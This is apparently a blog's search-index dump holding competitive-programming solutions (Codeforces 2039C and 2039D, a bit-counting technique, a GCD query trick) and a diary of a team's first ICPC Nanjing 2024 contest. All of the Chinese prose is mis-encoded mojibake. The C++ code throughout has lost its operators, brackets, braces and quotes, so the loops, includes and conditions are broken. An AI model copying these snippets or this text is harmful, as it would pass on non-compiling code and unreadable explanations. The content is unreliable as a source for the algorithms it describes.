ä½æ‰€è´¡çŒ®çš„å€¼ã€‚ä»¤ $a b$ï¼Œåˆ™æœ‰ï¼ˆåŠ ç²—è¡¨ç¤ºç¬¬ $i$ ä½ï¼‰ï¼š \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ t + b \\text{ changes to } 1\\textbf{1}0\\cdots 0\\ \\end{cases}ç”±å…¬å¼ $\\gcd (t + a,t + b) = \\gcd (t + a,b - a)$ å¯çŸ¥ï¼ˆåŠ ç²—è¡¨ç¤ºç¬¬ $i$ ä½ï¼‰ï¼š \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ b - a \\text{ changes to } 1\\textbf{0}00\\cdots 0\\ \\end{cases}æ­¤æ—¶ $\\gcd (t + a,b - a) = 2^i$ã€‚å½“å®é™… $x$ çš„ç¬¬ $i$ ä½ä¸º $1$ æ—¶ï¼Œä¼šäº§ç”Ÿ $2$ æ¬¡è¿›ä½ï¼Œä½¿å¾— $\\gcd (tâ€™ + a,b - a) = 2^{i + 1}$ã€‚å› æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š for (int i = 0;i 30;++i)//çŒœæµ‹ç¬¬ i ä½ int ans = query ((1 i) - x,(1 i) + (1 (i + 1)) - x); if (ans == 1 (i + 1)) x |= 1 i;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2039D Shohag Loves GCD","path":"/2024/11/27/CF2039D/","content":"ä»ç»™å®šé›†åˆä¸­é€‰æ•°å¹¶æ„é€ åºåˆ— $\\{a_i\\}$ï¼Œéœ€è¦æ»¡è¶³ $a_{\\gcd (i,j)} eq \\gcd(a_i,a_j) \\mid \\forall 1 \\le i j \\le n$ å¹¶ä¸”æ„é€ å‡ºçš„åºåˆ—å­—å…¸åºæœ€å¤§ã€‚ ä¸å¦¨ä»åé¢åˆ†æï¼Œè€ƒè™‘æ»¡è¶³ $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ã€‚å½“ $i \\mid j$ æ—¶ï¼Œ$\\gcd (i,j) = i$ï¼Œ$a_i \\mid a_j$ã€‚è¿›ä¸€æ­¥çš„ï¼Œå½“ $i mid j$ æ—¶ï¼Œæ˜¯å¦ä¹Ÿå­˜åœ¨ä¸€ä¸ª $i$ï¼Œæ»¡è¶³ $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ å‘¢ï¼Ÿ å‡è®¾å­˜åœ¨è¿™ä¸ª $i$ï¼Œæˆ‘ä»¬è®¾ $g = \\gcd (i,j)$ï¼Œé‚£ä¹ˆ $a_g = \\gcd (a_i,a_j)$ ä¸” $g i$ã€‚ç”±äº $g \\mid i$ï¼Œç­‰ä»·äº $g = \\gcd (g,i)$ï¼Œç”±ä¸Šé¢çš„ç»“è®ºå¯çŸ¥ $a_{\\gcd (g,i)} = \\gcd (a_g,a_i)$ã€‚æ­¤æ—¶ä¸é¢˜ç›®çš„æ¡ä»¶ä¸ç¬¦åˆï¼Œæ•…å‡è®¾ä¸æˆç«‹ã€‚ æ‰€ä»¥è¯´åœ¨æ„é€  $a_i$ æ—¶ï¼Œåªéœ€è¦è€ƒè™‘åºåˆ—ä»¥ $i$ çš„å› æ•°ï¼ˆä¸”å°äº $i$ï¼‰ä¸ºä¸‹æ ‡çš„æ•°ï¼Œé¢„å¤„ç†å› æ•°å³å¯ã€‚åœ¨æ„é€ çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰ä»¥ $i$ çš„å› æ•°ä¸ºä¸‹æ ‡çš„æ•°æ”¾å…¥ $\\mathrm{set}$ ä¸­ï¼Œç„¶åä»æœ€å¤§çš„æ•°å¼€å§‹ï¼ŒæŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªæœªå‡ºç°åœ¨é›†åˆä¸­çš„æ•°å³å¯é€€å‡ºå¾ªç¯ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#include set#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int M = 1e5; const int MOD = 1e9 + 7;inline int read ();vector int ans,p[MAX];int t,n,m,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); for (int i = 1;i = M;++i) for (int j = i + i;j = M;j += i) p[j].push_back (i);//j çš„å› æ•° t = read (); while (t--) n = read ();m = read (); for (int i = 1;i = m;++i) a[i] = read (); sort (a + 1,a + 1 + m);ans.clear (); for (int i = 1;i = n;++i) set int invaild; for (auto item : p[i]) invaild.insert (ans[item - 1]); for (int j = m;j;--j) if (invaild.find (a[j]) == invaild.end ()) ans.push_back (a[j]); break; if (ans.size () != i) break; if (ans.size () != n) puts (-1); else for (auto item : ans) printf (%d ,item);puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2039C Shohag Loves XOR","path":"/2024/11/26/CF2039C/","content":"ç»™å®š $x,m$ï¼Œæ±‚æœ‰å¤šå°‘ $y$ æ»¡è¶³ $y \\in [1,m]$ ä½¿å¾— $x \\oplus y$ å¯ä»¥è¢« $x$ æˆ– $y$ æ•´é™¤ã€‚ è®¾ $p = x \\oplus y$ï¼Œåˆ†ä¸‰ç§æƒ…å†µè®¨è®ºï¼š $x | p$ã€‚è®¾ $p = kx$ï¼Œåˆ™ $y = x \\oplus p \\le p + x \\le m$ï¼Œä¹Ÿå°±æ˜¯ $kx \\le m - x$ï¼Œè¿›ä¸€æ­¥åŒ–ç®€å¯çŸ¥ $k \\le \\lfloor \\frac{m - x}{x} \\rfloor$ã€‚ç”±äºæˆ‘ä»¬è¿˜æœ‰ $(m - x,m]$ åŒºé—´æœªæ£€æµ‹ï¼Œä½†å¯ä»¥å……åˆ†åˆ©ç”¨ $x \\oplus y \\le x + y$ è¿™ä¸ªæ€§è´¨ï¼Œæˆ‘ä»¬å¾ªç¯åˆ¤æ–­ $(m - x,m + x]$ åŒºé—´å³å¯ï¼ˆå½“ç„¶ï¼Œå®˜æ–¹è§£ç­”çš„åšæ³•æ›´åŠ ç®€æ´ï¼Œä½†æ˜¯æ²¡çœ‹æ‡‚ï¼‰ã€‚ $y | p$ã€‚å½“ $0 x y$ æ—¶ï¼Œ$p \\le x + y y + y = 2y$ï¼Œå› æ­¤ $p = ky(k \\ge 2)$ ä¸å­˜åœ¨è§£ã€‚å› æ­¤åªéœ€è¦è€ƒè™‘ $y \\le x$ çš„æƒ…å†µã€‚ $x | p$ ä¸” $y | p$ã€‚å½“ $x eq y$ æ—¶ï¼Œ$\\rm{lcm(x,y)} \\ge 2 \\max (x,y)$ï¼Œç„¶è€Œ $p 2 \\max (x,y)$ï¼Œå› æ­¤åªæœ‰ $x = y$ æ—¶æ‰èƒ½æˆç«‹ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();ll t;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) ll x = read (),n = read (),cnt = (n - x) / x + (n 2 * x x = n); for (ll i = (n - x) / x * x + 1;i = n + x;++i) //æšä¸¾ x ^ y if (1 = (i ^ x) (i ^ x) = n i % x == 0) ++cnt; for (ll i = 1;i = min (n,x);++i) // æšä¸¾ y if ((x ^ i) % i == 0) ++cnt; printf (%lld ,cnt - (n = x)); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"ä½æ€æƒ³","path":"/2024/11/21/Bits/","content":"Double Sum 2 é¢˜æ„ï¼š æ±‚æ‰€æœ‰æœ‰åºå¯¹ä¸€ç›´é™¤ä»¥ $2$ ç›´è‡³ä¸ºå¥‡æ•°åçš„å€¼çš„å’Œã€‚ éœ€è¦å‘ç°ä¸€ä¸ªæ€§è´¨ï¼Œè®¾ $f_i$ è¡¨ç¤ºæ‰€æœ‰èƒ½è¢« $2^i$ æ•´é™¤çš„å’Œï¼Œåˆ™ $f_{i + 1} - f_i$ è¡¨ç¤ºæ°å¥½æœ‰ $i$ ä¸ªå› å­ $2$ çš„å’Œï¼Œé‚£ä¹ˆå¯¹äºè¿™äº›å’Œï¼Œå¯¹ç­”æ¡ˆçš„è´¡çŒ®å°±æ˜¯ $\\dfrac{f_i}{2^i}$ã€‚ å› æ­¤æˆ‘ä»¬å¯¹äºæŒ‰ä½è€ƒè™‘ï¼Œå¯¹äºç¬¬ $i$ ä½ï¼Œåœ¨éå†è‡³ $a_j$ æ—¶è®¾ $sum_{a_j}$ è¡¨ç¤ºåœ¨å®ƒä¹‹åçš„ä¸å…¶äº’è¡¥çš„æ•°çš„å’Œï¼Œ$cnt_{a_j}$ è¡¨ç¤ºä¸å…¶äº’è¡¥çš„æ•°çš„ä¸ªæ•°ï¼ˆæ­¤å¤„äº’è¡¥çš„å®šä¹‰æ˜¯ä¸ $a_j$ ç›¸åŠ å¯ä»¥è¢« $2^i$ æ•´é™¤ï¼Œç”¨ $^a_j$ è¡¨ç¤ºï¼‰ã€‚å› æ­¤ä»åå¾€å‰éå†å³å¯å¾—åˆ° $f_i = \\sum \\limits_{j = 1}^n a_j \\times cnt_{^a_j} + sum_{^*a_j}$ã€‚ ä»£ç å¦‚ä¸‹ï¼š for (int i = 0;i = 25;++i) int p = 1 i; for (int j = n;j;--j) ++cnt[a[j] % p]; sum[a[j] % p] += a[j]; f[i] += a[j] * cnt[(p - a[j] % p) % p] + sum[(p - a[j] % p) % p]; for (int j = 1;j = n;++j) cnt[a[j] % p] = sum[a[j] % p] = 0;for (int i = 0;i 25;++i) ans += (f[i] - f[i + 1]) / (1 i);","categories":["Algorithm"]},{"title":"ICPC å°ç™½å‹‡é—¯å—äº¬","path":"/2024/11/02/ICPC Nanjing24/","content":"ç¬¬ 49 å±Š ICPC å—äº¬ç«™æ¸¸è®°ã€$2024.11.2-2024.11.3$ã€‘ Day $-2$ä¸‹åˆç¿˜è¯¾ï¼ŒVP äº† $2022$ å¹´å—äº¬çš„åŒºåŸŸèµ›ã€‚ä½†æ˜¯å¤§å®¶æ‰“å¾—å¹¶ä¸æ˜¯éå¸¸è®¤çœŸï¼Œæœ€ååªè¿‡äº† $5$ é¢˜ã€‚ å¼€å±€ç­¾åˆ°ï¼Œä½†æ˜¯æˆ‘è¯»é¢˜åŠ å†™é¢˜èŠ±äº† $20$ åˆ†é’Ÿã€‚çœ‹æ¥è¿˜æ˜¯æˆ‘è‹±è¯­æ°´å¹³ä¸å¤Ÿçš„é—®é¢˜ï¼Œå¥½åœ¨æ²¡æœ‰ç½šæ—¶ã€‚é˜Ÿå‹å¼€äº†ä¸€é“æ¯”ç­¾åˆ°ç¨å¾®éš¾ç‚¹çš„é¢˜ï¼Œä½†æ˜¯å¡åœ¨èƒŒåŒ…çš„æ­£ç¡®æ€§ä¸Šäº†ã€‚æˆ‘è¯»é¢˜åæå‡ºå…ˆæ’åºç„¶åå‰éƒ¨åˆ†èƒŒåŒ…åéƒ¨åˆ†è´ªå¿ƒçš„å†™æ³•ï¼Œç„¶åå¤§èƒ†å°è¯•ï¼Œä¸€å‘é€šè¿‡ã€‚ ç„¶åæ˜¯æ•°å­¦é¢˜ï¼Œç›´æ¥ä¸¢ç»™é˜Ÿå‹ï¼Œä»–ä»¬ä¿©è®¨è®ºäº†ä¸€ä¸‹ï¼Œå·®ä¸å¤šåœ¨ä¸€ä¸ªå¤šå°æ—¶çš„æ—¶å€™è¿‡äº†è¿™é“é¢˜ã€‚æ¥ç€é˜Ÿå‹å¼€å›¾è®ºï¼Œæˆ‘å¼€åˆ°äº†è¢‹é¼ é¢˜ï¼Œå‘ç°æ˜¯å¤§æ¨¡æ‹Ÿï¼Œå’Œå¦ä¸€ä¸ªé˜Ÿå‹è®¨è®ºå‡ºäº†ä¸€ä¸ªè§£æ³•åå°±è®©ä»–å†™äº†ï¼ˆäºæ˜¯æˆ‘å¼€å§‹æ‘†çƒ‚ï¼‰ã€‚ä½†æ˜¯ï¼Œæ¥ä¸‹å»çš„ä¸€ä¸ªå°æ—¶ï¼Œä»–è¿˜ä¸å®¹æ˜“å†™å®Œä»¥åå‘ç°è¿‡ä¸äº†ç¼–è¯‘ã€‚çœ‹äº†å¥½å‡ éä»¥åå‘ç°æ˜¯æ•°ç»„å¼€åˆ°äº† $10^9$ï¼Œç›´æ¥æ— è¯­ï¼Œåˆæ˜¯ä¸€é¡¿æ”¹ã€‚è¿‡æ ·ä¾‹ï¼äº¤ï¼å—¯ï¼Œæ€ä¹ˆ $\\texttt{RE on test2}$ï¼Ÿäºæ˜¯æˆ‘ä»¬å¼€å§‹çŒœæµ‹æ˜¯å°æ•°æ®æŒ‚è¿˜æ˜¯ç©ºé—´ç‚¸ï¼Œæˆ‘æœæ–­å¦å®šç©ºé—´ç‚¸ã€‚ç„¶è€Œï¼Œåœ¨å†™äº†ä¸ªæ•°æ®ç”Ÿæˆå™¨åå‘ç°å•ç»„æ•°æ®è¿è¡Œå…¨éƒ¨æ­£ç¡®ï¼Œä½†ç»„æ•°ä¸€å¤šç›´æ¥ç‚¸è£‚ï¼Œæˆ‘ä¸¢çœŸæ˜¯ $\\texttt{vector}$ çš„é”…ï¼ˆäºæ˜¯é˜Ÿå‹å¼€å§‹ç»™æˆ‘ä¸Šè¯¾â€”å‡¡äº‹ä¸è¦è¿‡æ—©ä¸‹ç»“è®ºã€‚æˆ‘ï¼šå•Šå§å•Šå§ï¼Œä½ å€’æ˜¯è¿‡äº†è¿™é¢˜å•Šï¼‰ã€‚ æ¥ä¸‹æ¥ä¸€ç›´æ”¹å•Šæ”¹ï¼Œç”¨ swap() å’Œ shrink_to_fit() ä½†æ˜¯è¿˜æ˜¯ $\\texttt{RE on test2}$ï¼Œç›´æ¥çº¢æ¸©ã€‚æœŸé—´æˆ‘å¼€äº† $\\texttt{M}$ é¢˜ï¼Œå‘ç°æ˜¯æ•°æ®ç»“æ„å¹¶æƒ³åˆ°äº†è§£æ³•ã€‚å¼‚æƒ³å¤©å¼€ç”¨é“¾è¡¨å»ç»´æŠ¤ï¼Œç„¶åç›´æ¥è¾“å‡ºäº†ä¸€å †è´Ÿæ•°ï¼Œå†æ¬¡çº¢æ¸©â€¦ å°±è¿™æ ·åˆ°æ¯”èµ›ç»“æŸï¼Œå†™äº† $7$ é¢˜ï¼Œä½†æ˜¯åªè¿‡äº† $5$ é¢˜â€¦â€¦ Day $-1$åœ¨ CEC è¯¾ä¸Šè¡¥é¢˜ï¼ŒæŠŠé˜Ÿå‹ä¹‹å‰æ¨¡æ‹Ÿå†™ $\\texttt{RE}$ çš„ä»£ç ç›´æ¥å…¨åˆ äº†ï¼Œç„¶åæŒ‰è‡ªå·±çš„æƒ³æ³•å†™äº†ä¸€æ¬¡ï¼Œ$20$ åˆ†é’Ÿç›´æ¥è¿‡äº†ã€‚éš¾ä¸æˆæ˜¯åœ¨è¯¾ä¸Šå†™é¢˜æœ‰åŠ æˆï¼Ÿ å®šäº†å‘¨äº”ä¸‹åˆçš„é£æœºï¼Œä½†åœ¨æ™šä¸Šæ”¶åˆ°é£æœºå»¶è¯¯åˆ°å‚æ™šçš„æ¶ˆæ¯ï¼Œäºæ˜¯æœæ–­ï¼ˆå…è´¹ï¼‰æ”¹ç­¾åˆ°äº†ä¸­åˆã€‚å“ï¼Œè¿™ä¸æ­£åˆæˆ‘æ„ï¼ Day $0$$12:50$ çš„é£æœºæ˜¯ $13:15$ é£çš„ï¼Œé—®é¢˜ä¸å¤§ã€‚ çœ‹åˆ°ä»Šæ™šæœ‰ $\\texttt{CF div2}$ï¼Œæœæ–­æŠ¥åï¼Œå¸Œæœ›åˆ«æ‰åˆ†ã€‚ æ™šä¸Š $\\texttt{CF}$ï¼Œ$\\texttt{B}$ é¢˜çœ‹é”™é¢˜ç›®ï¼Œç„¶åå˜æˆä¸€é“è¶…éš¾é¢˜ï¼Œäºæ˜¯ä¸€ç›´åœ¨æ­»ç£•ç›´åˆ°â€¦â€¦ä¸€å°æ—¶åçªç„¶å‘ç°æ˜¯ä¸­ä½æ•°è€Œéå¹³å‡æ•°ã€‚ æˆå‰§æ€§çš„ï¼Œæ¯é“é¢˜éƒ½æœ‰ç½šæ—¶ï¼Œç„¶å $\\texttt{D}$ èµ›åæ‰å¯¹ï¼Œäºæ˜¯é™å¤§åˆ†ã€‚ï¼ˆæ˜¯ä¸æ˜¯ä»å¦ä¸€æ–¹é¢è¯´æ˜åå¤©ä¸å†ä¼šçœ‹é”™é¢˜äº†ï¼‰ Day $1$è¶ç€é˜Ÿå‹è¿˜æ²¡åˆ°ï¼Œå…ˆå»ç­¾åˆ°å¤„é™„è¿‘è–…ç¾Šæ¯›ï¼æ”¶è·ä¸€æŠŠé›¨ä¼ï¼Œä¸€ä»¶çºªå¿µæ¬¾è¡£æœï¼Œä¸€ä¸ªèƒŒåŒ…ï¼Œä¸€ä¸ªå°ç¯ï¼Œä¸€ä¸ªå¹é£æœºå¤–åŠ ä¸€ä¸ªå¤šåŠŸèƒ½é—¹é’Ÿã€‚ å¿«åˆ°ä¸­åˆï¼Œé˜Ÿå‹æ‰ï¼ˆä¸€ç‚¹ç–²æƒ«åœ°ï¼‰åˆ°é…’åº—ï¼Œç„¶åç›´æ¥å»ç­¾åˆ°ã€‚åŒæ—¶ï¼Œä¹Ÿå¥ å®šäº†ä¸‹åˆçƒ­èº«èµ›è¦çƒ‚çš„èŠ‚å¥ã€‚ä¸‹åˆèµ›å‰åœ¨å­¦æ ¡é‡Œéšä¾¿é€›é€›ï¼Œçœ‹äº†å¤§ç°æœºã€‚ ä¸¤ç‚¹è¿›å…¥åˆ°ä½“è‚²é¦†ä¸­ï¼Œæ”¶è·äº†å±äºè‡ªå·±çš„é˜”çˆ±è¢‹é¼ ï¼å¬è£åˆ¤é•¿å‘è¨€ï¼Œè¿™æ¬¡æœ‰ä¸­æ–‡é¢˜é¢å¥½è¯„ï¼ä½†æ—è¾¹æ˜¯åŒ—äº¬å¤§å­¦ï¼Œå‹åŠ›æ‹‰æ»¡å·®è¯„ï¼ç„¶åå°±å¼€å§‹çƒ­èº«èµ›äº†ï¼Œå‘ç°æ˜¯æ²¡ç”¨è¿‡çš„ $\\texttt{linux}$ ç³»ç»Ÿï¼Œæ£é¼“äº†å¾ˆä¹…æ‰æ‰¾åˆ° $\\texttt{vscode}$ï¼Œåˆå¼„äº†å¾ˆä¹…ç»ˆäºå¯ä»¥è¾“å…¥è¾“å‡ºâ€¦â€¦ çƒ­èº«èµ›å…¨éƒ¨éƒ½æ˜¯å†å¹´çš„è¢‹é¼ é¢˜ï¼Œèƒ¡å‡ºæ¥å››é“é¢˜ç›®ï¼Œç„¶ååœ¨å†™ç¬¬ä¸‰é¢˜æ—¶ä¸€ç›´è¶…æ—¶ï¼ˆç„¶è€Œåœ¨ CF ä¸Šä¹Ÿæ˜¯è¿™ä¹ˆå†™çš„å´èƒ½è¿‡ï¼‰ï¼Œäºæ˜¯ç›´æ¥æ‘†çƒ‚ä¸å†™ã€‚æˆ‘ä»¬ä¸‰äººåˆ†åˆ«å¼€å§‹ç¡è§‰ã€ç©æ‰‹æœºã€å‘å‘†â€¦â€¦ç»“æŸæ—¶å‘ç°ä¸å°‘é˜Ÿä¼ç›´æ¥ AKï¼Œæ„Ÿè§‰æ˜å¤©è¦å®Œï¼ˆï¼‰ã€‚ ã€è¯´å¥é—²è¯ï¼Œæ¯äººå‘äº† $25$ å…ƒçš„é¤åˆ¸ä¸‰å¼ ï¼Œå´å‘ç°å¾ˆéš¾ç”¨å®Œï¼Œç¬¬ä¸€æ¬¡æƒ³è¦é£Ÿå ‚çš„ç‰©ä»·é«˜ä¸€ç‚¹â€¦â€¦ã€‘ Day $2$æ¯”èµ›å¼€å§‹ï¼Œä¸çŸ¥æ€çš„éå¸¸ç´§å¼ ã€‚æˆ‘å…ˆå¼€äº†ç­¾åˆ°ï¼Œä½†æ˜¯ä»¥ä¸ºæ˜¯å­—ç¬¦ä¸²å“ˆå¸Œï¼Œä½†æ˜¯æˆ‘å¯¹å­—ç¬¦ä¸²å“ˆå¸Œå¹¶ä¸æ˜¯ç‰¹åˆ«çš„ç†Ÿæ‚‰ï¼Œäºæ˜¯æŠŠé¢˜ç›®ä¸¢ç»™é˜Ÿå‹ã€‚è‡´å‘½çš„æ˜¯ï¼Œæˆ‘åœ¨ä¼ è¾¾æ—¶å¯¹å­åºåˆ—å’Œå­ä¸²æ²¡æœ‰ç‰¹åˆ«çš„å¼ºè°ƒï¼Œå¯¼è‡´é˜Ÿå‹åœ¨å†™ $\\texttt{KMP}$ï¼Œè€Œè¿™ä¸€å†™å°±æ˜¯åŠå°æ—¶ã€‚ç­‰æˆ‘æç„¶å¤§æ‚Ÿçš„æ—¶å€™ï¼Œå’Œé˜Ÿå‹è¯´äº†ï¼Œäºæ˜¯å¼€å§‹ä¿®ä¿®è¡¥è¡¥ï¼Œè¿‡æ ·ä¾‹äº¤ä¸Šå»è¿˜æŒ‚äº†ã€‚è¿˜æ˜¯æˆ‘ä¸Šå»å†™äº†ï¼Œæœ€ååœ¨ $1.5$ å°æ—¶æ‰è¿‡ã€‚è¿™æ—¶å€™æˆ‘ä»¬å…¶å®å®Œå…¨çš„æ…Œäº†ï¼Œæ¯«æ— èŠ‚å¥å¯è¨€ã€‚ çœ‹ $\\texttt{B}$ è®¤ä¸ºæ˜¯ä¸€é“åŠ¨å½’ï¼Œç„¶åç–¯ç‹‚å†™è½¬ç§»è¡¨è¾¾å¼ã€‚çœ‹ $\\texttt{G}$ åˆæ„Ÿè§‰åƒæ˜¯åŠ¨å½’ï¼Œè®¤ä¸ºä¸ä¼šã€‚å¦ä¸€ä¸ªé˜Ÿå‹å¼€ $\\texttt{J}$ï¼Œæ˜¯ç®€å•è´ªå¿ƒä½†æ˜¯ç»†èŠ‚è¶…å¤šï¼Œä¸æ–­ç¼ç¼è¡¥è¡¥ç„¶åä¸€ç›´è¿‡ä¸äº†æ ·ä¾‹ã€‚æˆ‘å°è¯•äº† $\\texttt{G}$ï¼Œæƒ³äº†åŒæ·±åº¦ä¸¤ç‚¹è¯¢é—®çš„åšæ³•ï¼Œä½†æ˜¯äº¤ä¸Šå» WAï¼Œå‘ç°é“¾çš„æƒ…å†µç›´æ¥é€€åŒ–åˆ° $n$ æ¬¡ã€‚ç„¶åæƒ³è¦æ‰¾é‡å¿ƒå¼è¯¢é—®ï¼Œä½†å‘ç°é“¾ä»èƒ½è¢« hackã€‚ é˜Ÿå‹å†™ $\\texttt{J}$ ç„¶åä¸€ç›´è°ƒä¸å¯¹ï¼Œç›´æ¥æ‰“å°æ¢é˜Ÿå‹å†™ $\\texttt{B}$ã€‚å†™äº†è¶…çº§ä¹…æœ€åè¢«æ ·ä¾‹ $4$ å¡äº†ï¼Œç›´æ¥å‘ç°æ˜¯å‡åšæ³•ã€‚å¥½ä¸å®¹æ˜“æ”¹è¿‡äº† $\\texttt{J}$ï¼Œè¿™æ—¶å€™å·²ç» $4$ å°æ—¶äº†ã€‚ æˆ‘åˆæƒ³äº†ä¸€ä¸ªæ¯æ¬¡è¯¢é—®ç›´å¾„ä¸¤ç«¯çš„åšæ³•ï¼Œä½†æ˜¯åœ¨ç»†èŠ‚ä¸Šå¹¶æ²¡æœ‰å¤„ç†çš„å¾ˆæ¸…æ¥šï¼Œèƒ½ä¸èƒ½åœ¨ $\\lfloor \\log_2 n \\rfloor$ å®Œæˆè¯¢é—®å…¶å®å¿ƒé‡Œå®Œå…¨æ²¡åº•ï¼Œè¿˜æ˜¯ä¸Šå»æ•²äº†ä»£ç ï¼Œä½†æ˜¯æœ‰è¿è¡Œé”™è¯¯ï¼Œåˆ°èµ›åä¹Ÿè°ƒå‡ºæ¥ã€‚ äºæ˜¯ï¼Œ$2$ é¢˜ç»“æŸæˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„ ICPCï¼Œå¹¶æ‹¿åˆ°äº†é“ç‰Œã€‚ åè®°æ€»çš„æ¥è¯´ï¼Œè¿™æ˜¯ä¸€æ¬¡å®Œå…¨å¤±è´¥çš„æ¯”èµ›ï¼Œæˆ‘ä»¬æœ‰æ•ˆåšé¢˜çš„æ—¶é—´ä¸è¶…è¿‡ $1.5$ å°æ—¶ã€‚éå¸¸å¥‡æ€ªï¼Œæˆ‘ä»¬ä¸€ä¸Šæ¥è¿ç­¾åˆ°é¢˜éƒ½å¼€å§‹è®¨è®ºã€‚ç„¶åï¼Œç”±äºæˆ‘ä»¬å£èƒ¡æƒ¯äº†ï¼Œæƒ³ä¸ä»”ç»†ï¼Œæ‰€ä»¥å‡ºç°äº†å¤šæ¬¡é¢˜ç›®æƒ³å‡ï¼Œä»£ç æ‰“è¡¥ä¸çš„æƒ…å†µï¼Œè¿™æ˜¯è‡´å‘½çš„ã€‚ è¿˜æœ‰å°±æ˜¯æ¯”èµ›çš„èŠ‚å¥æ˜¯å°¤å…¶é‡è¦çš„ï¼Œåƒä¸Šæ¬¡ç½‘ç»œèµ›æˆ‘ä»¬æ‰“äº† $7$ é¢˜ï¼Œå°±æ˜¯éå¸¸çš„é¡ºï¼Œæœºä¸Šæœºä¸‹åè°ƒçš„éƒ½æ˜¯éå¸¸å¥½ï¼Œå‡ ä¹æ²¡æœ‰å‡ºç°ç©ºæœºçš„æƒ…å†µï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥åšå‡ºè¿™ä¹ˆå¤šé¢˜ç›®çš„åŸå› ã€‚ è¿˜æœ‰ä¸€å‘¨å°±æ˜¯ CCPC é‡åº†ç«™ï¼Œèµ¶ç´§è¶ç€è¿™å‘¨å†ç»ƒä¹ è°ƒæ•´ä¸€ä¸‹ï¼ŒåŠ æ²¹å§ï¼ å½©è›‹å›å»çš„æ—¶å€™åœ¨æœºåœºå’Œé˜Ÿå‹ç© QQ é£è½¦ï¼Œç„¶åä¸€äººä¸€å±€ç›¸äº’ç ´çºªå½•ï¼Œç®€ç›´é€†å¤©ã€‚ èµ›åè¡¥é¢˜ $\\texttt{K}$ å…¶å®å°±æ˜¯ç®€å•è´ªå¿ƒã€‚æ˜¾ç„¶çš„æ˜¯æ¯æ¬¡åœ¨é»‘è‰²å—çš„åœ°æ–¹åˆ‡å¼€ï¼Œå°±åƒæ˜¯å¤šç»„æ•°æ®ã€‚å¯¹äºæ¯ä¸ªéœ€è¦å¤„ç†çš„åŒºé—´ï¼Œå…ˆä»å·¦å¾€å³æ‰«ï¼Œæ¯æ¬¡æ”¾çº¸æ¡çš„åœ°æ–¹æ˜¾ç„¶æ˜¯æœ‰çº¢è‰²çš„å—æœ€ä¼˜ã€‚æ”¾å®Œä»¥åéœ€è¦æ£€éªŒå³ç«¯æ˜¯å¦åœ¨èŒƒå›´å†…ã€‚è‹¥åœ¨èŒƒå›´ä¹‹å¤–ï¼Œåˆ™éœ€è¦ä»å³å¾€å·¦å†æ¬¡æ‰«ä¸€éï¼Œè¿›è¡Œçº¸æ¡çš„è°ƒæ•´ã€‚å¯ä»¥å‘ç°ï¼Œå³ä½¿çº¸æ¡ç»è¿‡è°ƒæ•´ï¼Œæ•°é‡ä»ç„¶æ˜¯ä¸å˜çš„ã€‚æœ€åï¼Œå¦‚æœæœ€å·¦ä¾§çš„çº¸æ¡ä»åœ¨èŒƒå›´å†…ï¼Œåˆ™æœ‰è§£ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š void solve (int l,int r,int w) if (l r) return ; int cnt = 0,p = l; while (w = n a[w] = r) paper[++cnt] = a[w]; p = a[w] + k; while (w = n a[w] p a[w] = r) ++w; if (!cnt) return ; paper[cnt] -= max (0,paper[cnt] + k - 1 - r); int tmp = cnt; while (tmp 1) paper[tmp - 1] -= max (0,paper[tmp - 1] + k - paper[tmp]),--tmp; if (paper[tmp] l) ok = 0; return ; for (int i = 1;i = cnt;++i) ans.push_back (paper[i]); $\\texttt{B}$ æ„Ÿè§‰å¾ˆ $\\texttt{Ad-hoc}$ã€‚å…ˆå°†å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å¶æ•°çš„ä½ç½®ä¸Šçš„æ•°å­—å–åï¼Œé—®é¢˜å°±ç­‰ä»·äºä¸ºæ¯æ¬¡åˆ å»ä¸¤ä¸ªç›¸é‚»ä¸”ç›¸åŒçš„å­—ç¬¦ã€‚ä¸éš¾å‘ç°å¾—åˆ°çš„ä¸²ä¸€å®šå…¨éƒ¨ä¸º $0$ æˆ– $1$ï¼Œè€Œæ¯ä¸€æ¬¡åˆ é™¤çš„æ•°éƒ½æ˜¯ä¸€ä¸ª $0$ ä¸€ä¸ª $1$ï¼Œå› æ­¤æœ€ä¼˜æƒ…å†µå°±æ˜¯æŠŠ $2$ 